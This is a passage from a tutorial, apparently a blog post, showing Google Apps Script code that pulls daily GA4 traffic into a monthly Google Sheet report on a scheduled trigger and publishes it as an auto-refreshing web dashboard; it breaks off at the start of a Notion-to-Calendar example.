Execute at YYYY-MM-DD HH:MM When Calendar: Updated Trigger Error notification settings allow you to configure how you are notified when a script execution fails.Grant Execution Permission Identity The first time you run/deploy or add a new service or resource, you need to reauthorize your identity. After authorization, all executions will run under your authorized identity, so make sure the account you authorize (usually the current one) has permission for the resource or service (e.g., access to the Google Sheet).After the account selection pop-up appears, choose the account to authorize execution (usually the current Google Apps Script account):The message ‚ÄúGoogle hasn‚Äôt verified this app‚Äù appears because the app we are developing is for personal use and does not require Google verification.Simply click ‚ÄúAdvanced‚Äù -&gt; ‚ÄúGo to XXX (unsafe)‚Äù -&gt; ‚ÄúAllow‚Äù:After completing the authorization, the script can run successfully. If the resources are unchanged, re-authorization is not required.2. Get/Create the Sheet for the Corresponding DateAfter understanding the basics, we can start writing the program for the first feature.We create the following multiple files to conveniently store different objects.DailyReportStyle.gs Column Style Object:class HeaderStyle { constructor() { this.color = \"#ffffff\"; this.backgroundColor = \"#e3284b\"; this.bold = false; this.size = 12; this.horizontalAlignment = \"center\"; this.verticalAlignment = \"middle\"; }}class ContentStyle { constructor() { this.color = \"#000000\"; this.backgroundColor = \"#ffffff\"; this.bold = false; this.size = 12; this.horizontalAlignment = \"center\"; this.verticalAlignment = \"middle\"; }}class HeaderDateStyle { constructor() { this.color = \"#ffffff\"; this.backgroundColor = \"#001a40\"; this.bold = true; this.size = 12; this.horizontalAlignment = \"center\"; this.verticalAlignment = \"middle\"; }}DailyReportField.gs field data object:class DailyReportField { constructor(name, headerStyle, contentStyle, format = null, value = null) { this.name = name; this.headerStyle = headerStyle; this.contentStyle = contentStyle; this.format = format; this.value = value; }}DailyReport.gs main script logic for the report:class DailyReport { constructor(sheetID, date) { this.separateSheet = SpreadsheetApp.openById(sheetID); this.date = date; this.sheetFields = [ new DailyReportField(\"Date\", new HeaderDateStyle(), new HeaderDateStyle()), new DailyReportField(\"Day of Week\", new HeaderDateStyle(), new HeaderDateStyle()), new DailyReportField(\"Daily Traffic\", new HeaderStyle(), new ContentStyle(), \"#,##0\", '=INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;4)+INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;5)'), // =4(PC Traffic) + 5(Mobile Traffic) new DailyReportField(\"PC Traffic\", new HeaderStyle(), new ContentStyle(), \"#,##0\"), new DailyReportField(\"Mobile Traffic\", new HeaderStyle(), new ContentStyle(), \"#,##0\"), new DailyReportField(\"Registrations\", new HeaderStyle(), new ContentStyle(), \"#,##0\") ] // Explanation of the Daily Traffic formula: // 1. The COLUMN() function returns the current cell's column number. // 2. ADDRESS(1, COLUMN(), 4) generates a relative address without $ signs for row 1 and the current column. For example, in column 3, it returns \"C1\". // 3. SUBSTITUTE(ADDRESS(1, COLUMN(), 4), \"1\", \"\") removes the \"1\" from the address, leaving just the column letter, e.g., \"C\". // 4. INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN(), 4), \"1\", \"\") &amp; 4) concatenates the column letter with 4 to form a reference like \"C4\", which INDIRECT converts to a cell reference. // 5. Similarly, INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN(), 4), \"1\", \"\") &amp; 5) references the cell in the same column but row 5. // 6. Finally, the formula adds the values from these two INDIRECT references. } execute() { const sheet = this.getSheet(); } // Get the target sheet for the given date getSheet() { // Use month to identify the sheet, find the current month sheet var thisMonthSheet = this.separateSheet.getSheetByName(this.getSheetName()); if (thisMonthSheet == null) { // If not found, create a new month sheet thisMonthSheet = this.makeMonthSheet(); } return thisMonthSheet; } // Naming rule for month sheets getSheetName() { return Utilities.formatDate(this.date, \"GMT+8\", \"yyyy-MM\"); } // Create a new month sheet makeMonthSheet() { // Add the current month sheet and move it to the first position var thisMonthSheet = this.separateSheet.insertSheet(this.getSheetName(), {index: 0}); thisMonthSheet.activate(); this.separateSheet.moveActiveSheet(1); // Insert first column: field names, set pinned columns, width 200 thisMonthSheet.insertColumnsBefore(1, 1); thisMonthSheet.setFrozenColumns(1); thisMonthSheet.setColumnWidths(1, 1, 200); // Fill in field names for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const text = sheetField.name; const style = sheetField.headerStyle; const range = thisMonthSheet.getRange(parseInt(currentRow) + 1, 1); this.setContent(range, text, style); range.setHorizontalAlignment(\"left\"); } // Set row heights thisMonthSheet.setRowHeights(1, Object.keys(this.sheetFields).length, 30); // Set pinned first and second rows (Date, Day of Week) thisMonthSheet.setFrozenRows(2); // Add total column thisMonthSheet.insertColumnsAfter(thisMonthSheet.getLastColumn(), 1); // Add one column after the last const summaryColumnIndex = thisMonthSheet.getLastColumn() + 1; // Fill total column for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const summaryRowIndex = parseInt(currentRow) + 1; const range = thisMonthSheet.getRange(summaryRowIndex, summaryColumnIndex); const style = sheetField.contentStyle; if (summaryRowIndex == 1) { // Date... this.setContent(range, \"Total\", style); } else if (summaryRowIndex == 2) { // Day of Week... merge... const mergeRange = thisMonthSheet.getRange(1, summaryColumnIndex, summaryRowIndex, 1); this.setContent(mergeRange, \"Total\", style); mergeRange.merge(); } else { this.setContent(range, '=IFERROR(SUM(INDIRECT(SUBSTITUTE(ADDRESS(1, 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+'):INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN() - 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+')), 0)', style); // 1. IFERROR(value, [value_if_error]) checks for errors in the formula and returns the specified value if an error occurs. Here, it returns 0 if SUM causes an error. // 2. SUM(range) calculates the total of all numbers in the range. // 3. INDIRECT(ref_text, [is_A1_notation]) converts a string to a cell reference, used here to dynamically generate the range. // 4. SUBSTITUTE(text, old_text, new_text, [instance_num]) replaces specified text in a string. Here, it removes \"1\" from the ADDRESS output. // 5. ADDRESS(row, column, [abs_num], [a1], [sheet]) returns a cell address. ADDRESS(1, 1, 4) returns the cell at row 1, column 1 without $ or sheet name. ADDRESS(1, COLUMN() - 1, 4) returns the address for the first row and the column before the current one. // 6. COLUMN() returns the current cell's column number. // 7. summaryRowIndex = current row } } return thisMonthSheet; } setContent(range, text, style) { if (String(text) != \"\") { range.setValue(text); } range.setBackgroundColor(style.backgroundColor); range.setFontColor(style.color); if (style.bold) { range.setFontWeight(\"bold\"); } range.setHorizontalAlignment(style.horizontalAlignment); range.setVerticalAlignment(style.verticalAlignment); range.setFontSize(style.size); range.setBorder(true, true, true, true, true, true, \"black\", SpreadsheetApp.BorderStyle.SOLID); }}Main.gs serves as the main program entry point:const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\"// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641function debug() { var report = new DailyReport(targetGoogleSheetID, new Date()); report.execute();}After finishing, return to Main.gs, select ‚Äúdebug,‚Äù and click debug to check if the execution results are correct and error-free.Executing correctly returns to the report showing the current new month, including default fields and total fields. If it already exists, there will be no response.3. Integrate Google Analytics to Fetch DataFirst, create the ‚ÄúAnalyticsData‚Äù service:Build Query Conditions Using GA4 Debug Tool: https://ga-dev-tools.google/ga4/query-explorer/ Can be compared when creating filter conditions in the GA4 backend This article uses querying the number of Sessions as an example to distinguish device Grouping After logging in and authorizing, select the target resource:Note down the number displayed under the property; this is the GA Property ID you need to query.Set query parameters and filter conditions:Press ‚ÄúMake Request‚Äù to get the Response result:You can also compare the data under the same conditions in the GA4 backend to see if they match. If there is a large discrepancy, it might be due to missing Filter conditions, so you should check again.SummaryHere is a small pitfall discovered by a marketing colleague: GA data can have delays, so the numbers you check today might differ from those checked yesterday (e.g., bounce rate). Therefore, it‚Äôs best to look back a few days to ensure the data reflects the final values. Once the GA Debug Tool works properly, we can convert it into Google Apps Script.Add a new file GAData.gs:// Remember to add Google Analytics Data API to Services, or you'll see this error: ReferenceError: AnalyticsData is not defined// GA Debug Tool: https://ga-dev-tools.web.app/ga4/query-explorer/class GAData { constructor(date) { this.date = date; const traffic = this.fetchGADailyUsage(); this.pc_traffic = traffic[\"desktop\"]; this.mobile_traffic = traffic[\"mobile\"]; } fetchGADailyUsage() { const dimensionPlatform = AnalyticsData.newDimension(); dimensionPlatform.name = \"deviceCategory\"; const metric = AnalyticsData.newMetric(); metric.name = \"sessions\"; const dateRange = AnalyticsData.newDateRange(); // Default query for data within the given date range e.g. 2024-01-01 ~ 2024-01-01 dateRange.startDate = this.getDateString(); dateRange.endDate = this.getDateString(); // Filter Example: // const filterExpression = AnalyticsData.newFilterExpression(); // const filter = AnalyticsData.newFilter(); // filter.fieldName = \"landingPagePlusQueryString\"; // const stringFilter = AnalyticsData.newStringFilter() // stringFilter.value = \"/life\\|/article\\|/chat\\|/house\\|/event/230502\\|/event/230310\"; // stringFilter.matchType = \"PARTIAL_REGEXP\"; // filter.stringFilter = stringFilter; // filterExpression.filter = filter; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [dimensionPlatform]; request.metrics = [metric]; request.dateRanges = dateRange; // Filter Example: // const filterExpression = AnalyticsData.newFilterExpression(); // filterExpression.expression = filterExpression; // request.dimensionFilter = filterExpression; // or Not // const notFilterExpression = AnalyticsData.newFilterExpression(); // notFilterExpression.notExpression = filterExpression; // request.dimensionFilter = notFilterExpression; const report = AnalyticsData.Properties.runReport(request, \"properties/\" + gaPropertyId).rows; // No data if (report == undefined) { return {\"desktop\": 0, \"mobile\": 0}; } // [{metricValues=[{value=4517}], dimensionValues=[{value=mobile}]}, {metricValues=[{value=3189}], dimensionValues=[{value=desktop}]}, {metricValues=[{value=63}], dimensionValues=[{value=tablet}]}] var result = {}; report.forEach(function(element) { result[element.dimensionValues[0].value] = element.metricValues[0].value; }); return result; } getDateString() { return Utilities.formatDate(this.date, \"GMT+8\", \"yyyy-MM-dd\"); }}Main.gs Add test content:const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const gaPropertyId = \"318495208\";function debug() { var report = new DailyReport(targetGoogleSheetID, new Date()); report.execute(); // var gaData = new GAData(new Date()); Logger.log(gaData);}Press Run or Debug to get the program fetch results:OK! Match confirmed.When this step is completed, the directory file structure will look like the image above.4. Data FillingAfter setting up the sheet and gathering the data, the next step is to fill the data into the fields.Adjust DailyReport.gs to add a new column by date and include logic to fill data:class DailyReport { constructor(sheetID, date, gaData, inHouseReportData) { this.separateSheet = SpreadsheetApp.openById(sheetID); this.date = date; const dateString = Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\"); const weekString = [\"Sunday\", \"Monday\",\"Tuesday\",\"Wednesday\",\"Thursday\",\"Friday\",\"Saturday\"][date.getDay()]; // Get the weekday, Sunday is 0, Monday is 1, etc. this.sheetFields = [ new DailyReportField(\"Date\", new HeaderDateStyle(), new HeaderDateStyle(), null, dateString), new DailyReportField(\"Weekday\", new HeaderDateStyle(), new HeaderDateStyle(), null, weekString), new DailyReportField(\"Daily Traffic\", new HeaderStyle(), new ContentStyle(), \"#,##0\", '=INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;4)+INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;5)'), // =4(PC traffic) + 5(Mobile traffic) new DailyReportField(\"PC Traffic\", new HeaderStyle(), new ContentStyle(), \"#,##0\", gaData.pc_traffic), new DailyReportField(\"Mobile Traffic\", new HeaderStyle(), new ContentStyle(), \"#,##0\", gaData.mobile_traffic), new DailyReportField(\"Registrations\", new HeaderStyle(), new ContentStyle(), \"#,##0\", inHouseReportData.registers) ] } execute() { const sheet = this.getSheet(); const dateColumnIndex = this.makeOrGetDateColumn(sheet); // Get existing or create new column // Fill column content for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const rowIndex = parseInt(currentRow) + 1; if (rowIndex != null) { const range = sheet.getRange(rowIndex, dateColumnIndex); const text = sheetField.value; const style = sheetField.contentStyle; this.setContent(range, text, style); this.setFormat(range, sheetField.format); } } } // Get the target sheet for the given date getSheet() { // Separate sheets by month, find sheet for current month var thisMonthSheet = this.separateSheet.getSheetByName(this.getSheetName()); if (thisMonthSheet == null) { // Create new month sheet if not found thisMonthSheet = this.makeMonthSheet(); } return thisMonthSheet; } // Month sheet naming getSheetName() { return Utilities.formatDate(this.date, \"GMT+8\", \"yyyy-MM\"); } // Create new month sheet makeMonthSheet() { // Add new sheet for current month, move to first position var thisMonthSheet = this.separateSheet.insertSheet(this.getSheetName(), {index: 0}); thisMonthSheet.activate(); this.separateSheet.moveActiveSheet(1); // Add first column, set header name, pin, width 200 thisMonthSheet.insertColumnsBefore(1, 1); thisMonthSheet.setFrozenColumns(1); thisMonthSheet.setColumnWidths(1, 1, 200); // Fill column names for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const text = sheetField.name; const style = sheetField.headerStyle; const range = thisMonthSheet.getRange(parseInt(currentRow) + 1, 1); this.setContent(range, text, style); range.setHorizontalAlignment(\"left\"); } // Set row heights thisMonthSheet.setRowHeights(1, Object.keys(this.sheetFields).length, 30); // Pin first and second rows (Date, Weekday) thisMonthSheet.setFrozenRows(2); // Add summary column thisMonthSheet.insertColumnsAfter(thisMonthSheet.getLastColumn(), 1); // Add column after last column const summaryColumnIndex = thisMonthSheet.getLastColumn() + 1; // Fill summary column for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const summaryRowIndex = parseInt(currentRow) + 1; const range = thisMonthSheet.getRange(summaryRowIndex, summaryColumnIndex); const style = sheetField.contentStyle; if (summaryRowIndex == 1) { // Date... this.setContent(range, \"Total\", style); } else if (summaryRowIndex == 2) { // Weekday...merge... const mergeRange = thisMonthSheet.getRange(1, summaryColumnIndex, summaryRowIndex, 1); this.setContent(mergeRange, \"Total\", style); mergeRange.merge(); } else { this.setContent(range, '=IFERROR(SUM(INDIRECT(SUBSTITUTE(ADDRESS(1, 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+'):INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN() - 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+')), 0)', style); } } return thisMonthSheet; } // Create or get date column // Add one column after the most recent date makeOrGetDateColumn(sheet) { const firstRowColumnsRange = sheet.getRange(1, 1, 1, sheet.getLastColumn()); // Get first row (date) range const firstRowColumns = firstRowColumnsRange.getValues()[0]; // Get values of first row var columnIndex = firstRowColumns.findIndex((date) =&gt; (date instanceof Date &amp;&amp; Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\") == Utilities.formatDate(this.date, \"GMT+8\", \"yyyy/MM/dd\"))); // Find column index for matching date if (columnIndex &lt; 0) { // Not found, find previous date's position var preDate = new Date(this.date); preDate.setDate(preDate.getDate() - 1); while(preDate.getMonth() == this.date.getMonth()) { columnIndex = firstRowColumns.findIndex((date) =&gt; (date instanceof Date &amp;&amp; Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\") == Utilities.formatDate(preDate, \"GMT+8\", \"yyyy/MM/dd\"))); if (columnIndex &gt;= 0) { break; } preDate.setDate(preDate.getDate() - 1); } if (columnIndex &gt;= 0) { columnIndex += 1; sheet.insertColumnsAfter(columnIndex, 1); // Insert new column after previous date column columnIndex += 1; } } else { columnIndex += 1; } if (columnIndex &lt; 0) { sheet.insertColumnsAfter(1, 1); // Default, insert new column after first column columnIndex = 2; } // Set column width sheet.setColumnWidths(columnIndex , 1, 100); return columnIndex } // Set column format style setFormat(range, format) { if (format != null) { range.setNumberFormat(format); } } // Fill content into column setContent(range, text, style) { if (String(text) != \"\") { range.setValue(text); } range.setBackgroundColor(style.backgroundColor); range.setFontColor(style.color); if (style.bold) { range.setFontWeight(\"bold\"); } range.setHorizontalAlignment(style.horizontalAlignment); range.setVerticalAlignment(style.verticalAlignment); range.setFontSize(style.size); range.setBorder(true, true, true, true, true, true, \"black\", SpreadsheetApp.BorderStyle.SOLID); }}Adjust Main.gs to add data connection and assign values during the build phase:const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const gaPropertyId = \"318495208\";function debug() { const date = new Date(); const gaData = new GAData(date); const inHouseReportData = fetchInHouseReportData(date); const report = new DailyReport(targetGoogleSheetID, date, gaData, inHouseReportData); report.execute(); }// Simulate some data which might be fetched from other platform APIs.function fetchInHouseReportData(date) { // EXAMPLE REQUEST: // var options = { // 'method' : 'get', // 'headers': { // 'Authorization': 'Bearer XXX' // } // }; // OR // var options = { // 'method' : 'post', // 'headers': { // 'Authorization': 'Bearer XXX' // }, // 'payload' : data // }; // var res = UrlFetchApp.fetch(url, options); // const result = JSON.parse(res.getContentText()); // REMEMBER, DUE TO SECURITY REASONS, we can't customize user-agent. return {\"registers\": Math.floor(Math.random() * (180 - 30 + 1)) + 30} // MOCK DATA random 30~180}After finishing, go back to Main.gs, select ‚Äúdebug,‚Äù and click ‚ÄúStart Debugging‚Äù to check if the execution results are correct and error-free.Back to Google Sheet! Success! We have successfully automated adding the data for that date.5. Set a schedule to run automatically every dayAfter the script is completed, just set the automatic trigger condition, and it will run automatically every day.Adjust Main.gs to add the cronjob() function:const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const gaPropertyId = \"318495208\";function debug() { cronjob();}// In reality, usually today's query is for yesterday's data to get complete informationfunction cronjob() { const yesterday = new Date(); yesterday.setDate(yesterday.getDate() - 1); const gaData = new GAData(yesterday); const inHouseReportData = fetchInHouseReportData(yesterday); const report = new DailyReport(targetGoogleSheetID, yesterday, gaData, inHouseReportData); report.execute();}// Simulate that some data might be obtained from other platform APIs.function fetchInHouseReportData(date) { // EXAMPLE REQUEST: // var options = { // 'method' : 'get', // 'headers': { // 'Authorization': 'Bearer XXX' // } // }; // OR // var options = { // 'method' : 'post', // 'headers': { // 'Authorization': 'Bearer XXX' // }, // 'payload' : data // }; // var res = UrlFetchApp.fetch(url, options); // const result = JSON.parse(res.getContentText()); // REMEMBER, DUE TO SECURITY REASONS, we can't customize user-agent. return {\"registers\": Math.floor(Math.random() * (180 - 30 + 1)) + 30} // MOCK DATA random 30~180}Switch to the ‚ÄúTrigger Conditions‚Äù tab in the editor, then select ‚ÄúAdd Trigger Condition‚Äù at the bottom right: Choose the function you want to execute: Newly added Main.gs Function cronjob Choose the deployment operation to execute: Head (meaning the latest version) Select Trigger Source: Time Driven Select the time-based trigger type: Daily timer Selected Time Slot: AM 4:00 ‚Äî AM 5:00 (GMT+08:00)Usually runs right at AM 4:00. Error Notification Settings: Should notifications be sent immediately when a script error occurs, or summarized once daily? Settings saved, completed.You can later check the execution records in the ‚ÄúTasks‚Äù tab: At this point, we have completed the RPA functions for automated query, data addition, and data entry in the report. üéâüéâüéâBuilding a Web GUI DashboardNext, there is a secondary requirement: we need to create a simple web display for daily data (similar to a command center concept) that will be shown directly on a large screen on the team‚Äôs back wall.The effect is shown in the image below:Add Web_DailyReport.gs to read Google Sheet and convert columns and styles into HTML format:class WebDailyReport { constructor(sheetID, dayCount) { this.separateSheet = SpreadsheetApp.openById(sheetID); this.dayCount = dayCount; this.sheetRows = [ \"Date\", \"Weekday\", \"Daily Traffic\", \"PC Traffic\", \"Mobile Traffic\", \"Registrations\" ]; } allData(startDate) { var sheetRowsIndexs = {}; var count = this.dayCount; var result = []; while (count &gt;= 0) { const preDate = new Date(startDate); preDate.setDate(preDate.getDate() - (this.dayCount - count)); const sheetName = Utilities.formatDate(preDate, \"GMT+8\", \"yyyy-MM\"); const targetSheet = this.separateSheet.getSheetByName(sheetName); if (targetSheet != null) { const firstRowColumnsRange = targetSheet.getRange(1, 1, 1, targetSheet.getLastColumn()); // Get first row (date) data range const firstRowColumns = firstRowColumnsRange.getValues()[0]; // Get values of the data range, 0 = first row var columnIndex = firstRowColumns.findIndex((date) =&gt; (date instanceof Date &amp;&amp; Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\") == Utilities.formatDate(preDate, \"GMT+8\", \"yyyy/MM/dd\"))); // Find column index for the date if (columnIndex &gt;= 0) { columnIndex = parseInt(columnIndex) + 1; if (sheetRowsIndexs[sheetName] == undefined \\|\\| sheetRowsIndexs[sheetName] == null) { sheetRowsIndexs[sheetName] = this.sheetRows.map((sheetRow) =&gt; this.getFieldRow(targetSheet, sheetRow)); } if (result.length == 0) { // Add first column const ranges = sheetRowsIndexs[sheetName].map((rowIndex) =&gt; (rowIndex != null) ? (targetSheet.getRange(rowIndex, 1)) : (null)); result.push(this.makeValues(ranges)); } const ranges = sheetRowsIndexs[sheetName].map((rowIndex) =&gt; (rowIndex != null) ? (targetSheet.getRange(rowIndex, columnIndex)) : (null)); result.push(this.makeValues(ranges)); } } count -= 1; } var transformResult = {}; for (const columnIndex in result) { for (const rowIndex in result[columnIndex]) { if (transformResult[rowIndex] == undefined) { transformResult[rowIndex] = []; } if (columnIndex == 0) { transformResult[rowIndex].unshift(result[columnIndex][rowIndex]); } else { transformResult[rowIndex].splice(1, 0, result[columnIndex][rowIndex]); } } } return transformResult; } // Convert field attribute values into display objects makeValues(ranges) { const data = ranges.map((range) =&gt; (range != null) ? (range.getDisplayValues()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const backgroundColors = ranges.map((range) =&gt; (range != null) ? (range.getBackgrounds()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const colors = ranges.map((range) =&gt; (range != null) ? (range.getFontColorObjects()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const sizes = ranges.map((range) =&gt; (range != null) ? (range.getFontSizes()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const bolds = ranges.map((range) =&gt; (range != null) ? (range.getFontWeights()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const horizontalAlignments = ranges.map((range) =&gt; (range != null) ? (range.getHorizontalAlignments()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const verticalAlignments = ranges.map((range) =&gt; (range != null) ? (range.getVerticalAlignments()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); var result = []; for(const index in data) { const row = data[index]; result.push({ \"value\": row, \"backgroundColor\": backgroundColors[index], \"color\": this.colorStripper(colors[index]?.asRgbColor()?.asHexString()), \"size\": sizes[index], \"bold\": bolds[index], \"horizontalAlignment\": this.alignConventer(horizontalAlignments[index]), \"verticalAlignment\": verticalAlignments[index] }); } return result; } colorStripper(colorString) { if (colorString == undefined \\|\\| colorString == null) { return null } if (colorString.length == 9) { return \"#\"+colorString.substring(3, 9); } else { return colorString; } } alignConventer(horizontalAlignment) { if (horizontalAlignment == undefined \\|\\| horizontalAlignment == null) { return null } return horizontalAlignment.replace('general-', '') } getFieldRow(sheet, name) { const firstColumnRowsRange = sheet.getRange(1, 1, sheet.getLastRow(), 1); // Get first column (field) data range const firstColumnRows = firstColumnRowsRange.getValues(); // Get values of the data range const foundIndex = firstColumnRows.findIndex((firstColumnRow) =&gt; firstColumnRow[0] == name); if (foundIndex &lt; 0) { return null; } else { return foundIndex + 1; } }}Main.gs Add Web Request Handler:const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const gaPropertyId = \"318495208\";function debug() { cronjob();}function cronjob() { const yesterday = new Date(); yesterday.setDate(yesterday.getDate() - 1); const gaData = new GAData(yesterday); const inHouseReportData = fetchInHouseReportData(yesterday); const report = new DailyReport(targetGoogleSheetID, yesterday, gaData, inHouseReportData); report.execute();}function doGet(e) { return HtmlService.createTemplateFromFile('Web_DailyReport_ Scaffolding').evaluate();}function getDailyReportBody() { const html = HtmlService.createTemplateFromFile('Web_DailyReport_Body').evaluate().getContent(); return html;}// FOR POST// function doPost(e) {// ref: https://developers.google.com/apps-script/guides/web?hl=zh-tw// }// Simulate some data that might be obtained from other platform APIs.function fetchInHouseReportData(date) { // EXAMPLE REQUEST: // var options = { // 'method' : 'get', // 'headers': { // 'Authorization': 'Bearer XXX' // } // }; // OR // var options = { // 'method' : 'post', // 'headers': { // 'Authorization': 'Bearer XXX' // }, // 'payload' : data // }; // var res = UrlFetchApp.fetch(url, options); // const result = JSON.parse(res.getContentText()); // REMEMBER, DUE TO SECURITY REASONS, we can't customize user-agent. return {\"registers\": Math.floor(Math.random() * (180 - 30 + 1)) + 30} // MOCK DATA random 30~180}Added Web_DailyReport_ Scaffolding.html Web Dashboard framework. Since our command center screens need to update content automatically, we created a web scaffold that periodically fetches HTML content using Ajax:&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;base target=\"_top\"&gt; &lt;script&gt; function onSuccess(html) { if (html != null) { var div = document.getElementById('result'); div.innerHTML = html; } } setInterval(()=&gt;{ google.script.run.withSuccessHandler(onSuccess).getDailyReportBody() }, 1000 * 60 * 60 * 1); google.script.run.withSuccessHandler(onSuccess).getDailyReportBody(); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"result\"&gt;Loading...&lt;/div&gt; &lt;/body&gt;&lt;/html&gt;Added Web_DailyReport_Body.html where data is actually rendered into HTML:&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;base target=\"_top\"&gt; &lt;style&gt; table { border-collapse: collapse; width: 100%; text-align: center; } th, td { border: 1px solid #000000; padding: 8px; text-align: center; font-size: 36px; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1 style=\"text-align:center\"&gt;ZHGCHG.LI&lt;/h1&gt; &lt;table id=\"dataTable\"&gt; &lt;tbody&gt; &lt;? // Display data for the past 7 days const dashboard = new WebDailyReport(targetGoogleSheetID, 7); // Start from yesterday const yesterday = new Date(); yesterday.setDate(yesterday.getDate() - 1); const data = dashboard.allData(yesterday); for(const rowIndex in data) { const row = data[rowIndex]; ?&gt; &lt;tr&gt; &lt;? for(const columnIndex in row) { const column = row[columnIndex]; ?&gt; &lt;td style=\"background-color: &lt;?=column[\"backgroundColor\"]?&gt;; color: &lt;?=column[\"color\"]?&gt;; text-align: &lt;?=column[\"horizontalAlignment\"]?&gt;;\"&gt; &lt;?=column[\"value\"]?&gt; &lt;/td&gt; &lt;? } ?&gt; &lt;/tr&gt; &lt;? } ?&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;script&gt; &lt;/body&gt;&lt;/html&gt; Please note, we retrieve data from the past 7 days starting from yesterday, so today‚Äôs data will not be shown.The project file directory after completing the above steps is as follows:Test Deployment:Click the project‚Äôs top right corner ‚ÄúDeploy‚Äù -&gt; ‚ÄúTest Deployment Operation‚Äù After deployment, click the link to view the test results. Please note this URL is for one-time testing only. If the code is modified, you need to click the test deployment again. If stuck on Loading‚Ä¶ with no content or a server error appears, you can go back to the editor‚Äôs ‚ÄúRun Items‚Äù tab to check the error messages:Complete Formal Deployment:If the testing is successful, the official deployment can be completed and the URL released.Click the project‚Äôs top right corner ‚ÄúDeploy‚Äù -&gt; ‚ÄúNew deployment‚Äù -&gt; top left ‚ÄúSelect type‚Äù -&gt; ‚ÄúWeb app‚Äù: Execution identity: Default to the current account (same as the Google Apps Script user) Who can access: Set to ‚ÄúAnyone with the link‚Äù so anyone who knows the URL can access, or set to ‚ÄúOrganization only,‚Äù which requires Google sign-in to access. Deployment completed, URL obtained. Code changes require redeployment to take effect:Please note that when the code changes, redeployment is required (the URL will not change) for the changes to take effect; otherwise, the old version will persist.Click the project‚Äôs top right corner ‚ÄúDeploy‚Äù -&gt; ‚ÄúManage Deployments‚Äù:Click the top right ‚ÄúPen üñäÔ∏è ICON‚Äù -&gt; ‚ÄúVersions‚Äù -&gt; ‚ÄúCreate New Version‚Äù -&gt; ‚ÄúDeploy‚Äù.After deployment, click the URL or refresh the original URL to see the updated changes.üéâüéâDone! All our RPA requirements have been completed.üéâüéâFinal Result:(Update the program to backfill this month‚Äôs data; otherwise, with fresh data, there will be only one record from yesterday) https://script.google.com/macros/s/AKfycbz2Vk-ikU8DSXjpnLq9r6HNAn3zlNAosvDoItG0cxy0bmItRDSVyEzTdwsL2HyFUz99/execComplete Google Sheet Demo: Google Sheet:https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit?usp=sharing Web GUI URL:https://script.google.com/macros/s/AKfycbz2Vk-ikU8DSXjpnLq9r6HNAn3zlNAosvDoItG0cxy0bmItRDSVyEzTdwsL2HyFUz99/exec Google Apps Script:https://script.google.com/home/projects/1vHgXPTV_q8MC75FVzAEtzD2JPVnPBpMfFXbjZR7SLMVjoEH1FcjKlo8l/edit Other Daily Life Applications:Robotic Process Automation with Google Apps Script ‚Äî Github Repo Star Notifier to LineRobotic Process Automation with Google Apps Script ‚Äî Notion Database to CalendarPreviously implemented a simple Notion to Calendar feature. The implementation connects to the Notion API to fetch database data and generate an ICS format webpage, then deploys it as a public webpage; just add this URL to Apple Calendar.Main.gs :// Constant variablesconst notionToken = \"XXXXX\";const safeToken 